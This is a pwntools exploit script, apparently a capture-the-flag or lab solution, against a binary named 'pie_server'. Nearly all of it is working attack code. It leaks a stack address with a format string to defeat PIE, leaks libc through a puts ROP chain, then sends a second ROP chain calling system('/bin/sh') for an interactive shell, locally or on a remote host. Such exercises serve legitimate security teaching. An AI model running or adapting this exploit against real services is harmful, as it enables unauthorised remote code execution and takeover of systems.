from pwn import *


# Allows you to switch between local/GDB/remote
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# GDB script 
gdbscript = '''
init-pwndbg
break main
continue
'''.format(**locals())


# Set the correct architecture
exe = './pie_server'
# the context arch, bits, os and other
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging (info/debug)
context.log_level = 'debug'



# EXPLOIT


# Offset to RIP
offset = 264

# Start program
io = start()

# Offset of pop_rdi gadget from ropper (manual)
# We need to find the PIEBASE before we can use
pop_rdi_offset = 0x12ab

ret_offset = 0x1016

# Leak 15th address from stack (main+44)
# After the program prompts the user with ":" send a format string pointer "%p" to the 15th address from the stack "%15$p"
io.sendlineafter(b':', '%{}$p'.format(15), 16)
io.recvuntil(b'Hello ')  # Keep receiving data until the program is going to send Hello
leaked_addr = int(io.recvline(), 16) # Format the leaked address into hex
info("leaked_address: %#x", leaked_addr) # Print the leaked address to the user

# Now calculate the PIEBASE
elf.address = leaked_addr - 0x1224
info("piebase: %#x", elf.address)

# Update pop_rdi gadget with the base address of the binary
pop_rdi = elf.address + pop_rdi_offset

ret = elf.address + ret_offset
# Payload to leak libc function
payload = flat({
    offset: [
        pop_rdi,  # Pop got.puts into RDI
        elf.got.puts,
        elf.plt.puts,  # Call puts() to leak the got.puts address
        elf.symbols.vuln  # Return to vuln (to overflow buffer with another payload)
    ]
})

# Send the payload
io.sendlineafter(b':P', payload)

io.recvlines(2)  # Blank line

# Retrieve got.puts address
got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

# Subtract puts offset to get libc base
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
libc_base = got_puts - 0x84420
info("libc_base: %#x", libc_base)

# Add offsets to get system() and "/bin/sh" addresses
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
system_addr = libc_base + 0x52290
info("system_addr: %#x", system_addr)
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
bin_sh = libc_base + 0x1b45bd
info("bin_sh: %#x", bin_sh)

# Payload to get shell: system('/bin/sh')
payload = flat({
    offset: [
        pop_rdi,
        bin_sh,
        ret,
        system_addr
    ]
})

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
